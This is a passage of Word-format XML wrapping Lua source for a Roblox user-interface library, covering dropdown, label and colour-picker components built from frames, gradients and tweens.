    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "dropdown" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -12, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;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TextTruncate = Enum.TextTruncate.AtEnd;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AutomaticSize = Enum.AutomaticSize.Y;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"sub_text" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingTop = dim(0, 1);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"indicator" ] = library:create( "ImageLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ImageColor3 = rgb(86, 86, 87);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "dropdown" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AnchorPoint = vec2(1, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Image = "rbxassetid://101025591575185";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(1, -5, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 12, 0, 12);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-- </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Element Holder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "dropdown_holder" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = library[ "items" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Visible = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ZIndex = 10;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"outline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "dropdown_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ClipsDescendants = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(33, 33, 35);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ZIndex = 10;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PaddingBottom = dim(0, 6);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingTop = dim(0, 3);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingLeft = dim(0, 3);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "outline"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"outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Padding = dim(0, 5);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"outline"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-- </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.render_option(text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local button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rgb(72, 72, 73);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Text = text;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Size = dim2(1, -12,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255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ZIndex = 10;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }); library:apply_theme(button, "accent", "TextColor3");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button;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingTop = dim(0, 1);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return button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cfg.set_visible(bool)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local a = bool and cfg.y_size or 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "dropdown_holder" ], {Size = dim_offset(items[ "dropdown" ].AbsoluteSize.X, a)})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "dropdown_holder" ].Position = dim2(0, items[ "dropdown" ].AbsolutePosition.X, 0, items[ "dropdown" ].AbsolutePosition.Y + 80)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not (self.sanity and library.current_open == self) then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:close_element(cfg)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cfg.set(value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local selected = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local isTable = type(value) == "table"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, option in cfg.option_instances do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if option.Text == value or (isTable and find(value, option.Text)) then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        insert(selected, option.Text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.multi_items = selected</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        option.TextColor3 = themes.preset.accent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        option.TextColor3 = rgb(72, 72, 73)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "sub_text" ].Text = isTable and concat(selected, ", ") or selected[1] or ""</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flags[cfg.flag] = isTable and selected or selected[1]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.callback(flags[cfg.flag]) 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cfg.refresh_options(list) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.y_size = 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, option in cfg.option_instances do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    option:Destroy() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.option_instances = {} </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, option in list do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local button = cfg.render_option(option)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.y_size += button.AbsoluteSize.Y + 6 -- super annoying manual sizing but oh well</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    insert(cfg.option_instances, button)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    button.InputBegan:Connect(function(Input)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        if cfg.multi then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local selected_index = find(cfg.multi_items, button.Text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if selected_index then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                remove(cfg.multi_items, selected_index)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                insert(cfg.multi_items, button.Text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.set(cfg.multi_items) </w:t>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        else </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.set_visible(false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.open = false </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.set(button.Text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end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items[ "dropdown" ].InputBegan:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.open = not cfg.open  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set_visible(cfg.open)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if cfg.seperator then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flags[cfg.flag] = {} </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            config_flags[cfg.flag] = cfg.set</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            cfg.refresh_options(cfg.options)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            cfg.set(cfg.default)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return setmetatable(cfg, library)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:label(options)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                enabled = options.enabled or nil,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or "Toggle",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                seperator = options.seperator or options.Seperator or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                info = options.info or nil; </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};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items[ "label" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.small;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"label"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/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if cfg.info then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "info" ] = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FontFace = fonts.small;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextColor3 = rgb(130, 130, 130);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextWrapped = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = cfg.info;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "label" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 5, 0, 17);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -10,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"label" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 0, 1, 0);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FillDirection = Enum.FillDirection.Horizontal;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    HorizontalAlignment = Enum.HorizontalAlignment.Right;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 9);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SortOrder = Enum.SortOrder.LayoutOrder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if cfg.seperator then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = self.items[ "elements" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(36, 36, 37)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library:colorpicker(options) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or "Color", </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flag = options.flag or library:next_flag(),</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                color = options.color or color(1, 1, 1), -- Default to white color if not provided</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                alpha = options.alpha and 1 - options.alpha or 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                open = false, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = options.callback or function() end,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                seperator = options.seperator or options.Seperator or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local dragging_sat = false </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local dragging_hue = false </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local dragging_alpha = false </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local h, s, v = cfg.color:ToHSV() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local a = cfg.alpha </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            flags[cfg.flag] = {Color = cfg.color, Transparency = cfg.alpha}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local label; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not self.items.right_components then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                label = self:label({name = cfg.name, seperator = cfg.seperator})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Component</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "colorpicker" ]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Parent = label and label.items.right_components or self.items[ "right_components"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Size = dim2(0, 16, 0, 16);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rgb(54, 31, 184)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"colorpicker"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"colorpicker_inline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "colorpicker" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -2, 1, -2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderMode = Enum.BorderMode.Inset;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(54, 31, 184)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    library:create( "UIScale" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "colorpicker_inline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Scale = scale;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">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"colorpicker_inline"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rgb(211, 211, 211)), rgbkey(1, rgb(211, 211, 211))};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "colorpicker_inline" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });         </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Colorpicker</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "colorpicker_holder" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = library[ "other" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0.20000000298023224, 20, 0.296999990940094, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 166, 0, 197);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Visible = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(25, 25, 29)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "colorpicker_fade" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "colorpicker_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundTransparency = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 0, 0, 0);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ZIndex = 100;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(25, 25, 29)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"colorpicker_components" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "colorpicker_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -2, 1, -2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(22, 22, 24)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"colorpicker_components"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"saturation_holder" ] = library:create( "Frame" , {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Position = dim2(0, 7, 0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -14, 1, -80);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(255, 39, 39)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"sat" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "saturation_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, 0, 1,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BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ZIndex = 2;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"sat"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Rotation = 270;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Transparency = numseq{numkey(0, 0), numkey(1, 1)};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "sat" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Color = rgbseq{rgbkey(0, rgb(0, 0, 0)), rgbkey(1, rgb(0, 0, 0))}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"val" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "saturation_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);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Parent = items[ "val" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Transparency = numseq{numkey(0, 0), numkey(1, 1)}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"val"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"saturation_holder"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"satvalpicker" ] = library:create( "TextButton" , {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vec2(0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "saturation_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 0, 4, 0);</w:t>
      </w:r>
